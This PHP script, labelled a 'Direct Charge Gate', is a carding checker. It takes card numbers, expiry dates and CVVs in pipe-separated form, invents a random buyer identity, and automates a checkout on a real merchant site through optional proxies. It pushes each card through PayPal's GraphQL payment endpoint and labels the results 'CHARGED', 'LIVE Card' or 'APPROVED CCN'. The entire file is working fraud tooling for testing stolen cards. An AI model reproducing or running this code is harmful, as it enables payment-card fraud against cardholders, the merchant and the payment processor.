<?php
// Direct Charge Gate - SwitchupCB + PayPal GraphQL
// Returns JSON response

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    parse_str(file_get_contents('php://input'), $input);
}

$cc = $input['cc'] ?? $_POST['cc'] ?? '';
$proxy = $input['proxy'] ?? $_POST['proxy'] ?? '';

if (empty($cc)) {
    echo json_encode(['success' => false, 'error' => 'No card provided']);
    exit;
}

$parts = explode('|', $cc);
if (count($parts) < 4) {
    echo json_encode(['success' => false, 'error' => 'Invalid card format']);
    exit;
}

list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);

if (strlen($year) == 2) $year = '20' . $year;
$yearTwoDigit = substr($year, -2);
$month = str_pad($month, 2, '0', STR_PAD_LEFT);

$firstNames = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"];
$lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];

$firstName = $firstNames[array_rand($firstNames)];
$lastName = $lastNames[array_rand($lastNames)];
$email = strtolower($firstName) . rand(100, 999) . "@gmail.com";
$phone = "1" . rand(200, 999) . rand(1000000, 9999999);
$street = rand(100, 999) . " Main St";
$city = "New York";
$state = "NY";
$zip = "10001";

// Step 1: Add to cart
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/shop/i-buy/");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "quantity=1&add-to-cart=4451");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_exec($ch);
curl_close($ch);

// Step 2: Get checkout page
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/checkout/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
$response = curl_exec($ch);
curl_close($ch);

if (empty($response)) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Connection timeout', 'gateway' => 'Direct Charge $2']);
    exit;
}

preg_match('/update_order_review_nonce":"([^"]+)"/', $response, $secMatch);
preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $response, $checkMatch);
preg_match('/create_order.*?nonce":"([^"]+)"/', $response, $createMatch);

$sec = $secMatch[1] ?? '';
$check = $checkMatch[1] ?? '';
$create = $createMatch[1] ?? '';

if (empty($sec) || empty($check) || empty($create)) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Failed to extract checkout tokens', 'gateway' => 'Direct Charge $2']);
    exit;
}

// Step 3: Update order review
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/?wc-ajax=update_order_review");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "security={$sec}&payment_method=stripe&country=US&state={$state}&postcode={$zip}&city=" . urlencode($city) . "&address=" . urlencode($street) . "&billing_first_name={$firstName}&billing_last_name={$lastName}&billing_phone={$phone}&billing_email=" . urlencode($email) . "&terms-field=1&woocommerce-process-checkout-nonce={$check}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_exec($ch);
curl_close($ch);

// Step 4: Create PayPal order
$formEncoded = "billing_first_name={$firstName}&billing_last_name={$lastName}&billing_company=&billing_country=US&billing_address_1=" . urlencode($street) . "&billing_address_2=&billing_city=" . urlencode($city) . "&billing_state={$state}&billing_postcode={$zip}&billing_phone={$phone}&billing_email=" . urlencode($email) . "&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={$check}&ppcp-funding-source=card";

$jsonData = json_encode([
    'nonce' => $create,
    'payer' => null,
    'bn_code' => 'Woo_PPCP',
    'context' => 'checkout',
    'order_id' => '0',
    'payment_method' => 'ppcp-gateway',
    'funding_source' => 'card',
    'form_encoded' => $formEncoded,
    'createaccount' => false,
    'save_payment_method' => false
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/?wc-ajax=ppc-create-order");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
$response = curl_exec($ch);
curl_close($ch);

$orderData = json_decode($response, true);
$orderId = $orderData['data']['id'] ?? '';

if (empty($orderId)) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Failed to create PayPal order', 'gateway' => 'Direct Charge $2']);
    exit;
}

// Step 5: Submit card via PayPal GraphQL
$graphqlQuery = 'mutation payWithCard($token: String!, $card: CardInput!, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress) { flags { is3DSecureRequired } } }';

$cardType = preg_match('/^4/', $cardNumber) ? 'VISA' : (preg_match('/^5/', $cardNumber) ? 'MASTER_CARD' : 'VISA');

$variables = [
    'token' => $orderId,
    'card' => [
        'cardNumber' => $cardNumber,
        'type' => $cardType,
        'expirationDate' => "{$month}/{$yearTwoDigit}",
        'postalCode' => $zip,
        'securityCode' => $cvv
    ],
    'firstName' => $firstName,
    'lastName' => $lastName,
    'email' => $email,
    'billingAddress' => [
        'givenName' => $firstName,
        'familyName' => $lastName,
        'line1' => $street,
        'city' => $city,
        'state' => $state,
        'postalCode' => $zip,
        'country' => 'US'
    ]
];

$graphqlPayload = json_encode(['query' => $graphqlQuery, 'variables' => $variables]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/graphql");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $graphqlPayload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', "Paypal-Client-Context: {$orderId}"]);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200 || empty($response)) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Payment gateway timeout', 'gateway' => 'Direct Charge $2']);
    exit;
}

$responseUpper = strtoupper($response);

if (strpos($responseUpper, 'APPROVED') !== false || strpos($responseUpper, '"STATUS":"SUCCEEDED"') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => 'CHARGED $2 🔥', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'IS3DSECUREREQUIRED') !== false || strpos($responseUpper, '3DS') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => '3D Secure Required (LIVE Card)', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'INVALID_SECURITY_CODE') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => 'APPROVED CCN (CVV Failed)', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'INVALID_BILLING_ADDRESS') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => 'APPROVED - AVS', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'INSUFFICIENT_FUNDS') !== false) {
    echo json_encode(['success' => true, 'status' => 'approved', 'message' => 'INSUFFICIENT FUNDS (LIVE Card)', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'CARD_DECLINED') !== false) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Card Declined', 'gateway' => 'Direct Charge $2']);
} elseif (strpos($responseUpper, 'EXPIRED') !== false) {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Card Expired', 'gateway' => 'Direct Charge $2']);
} else {
    echo json_encode(['success' => true, 'status' => 'declined', 'message' => 'Card Declined', 'gateway' => 'Direct Charge $2']);
}
?>
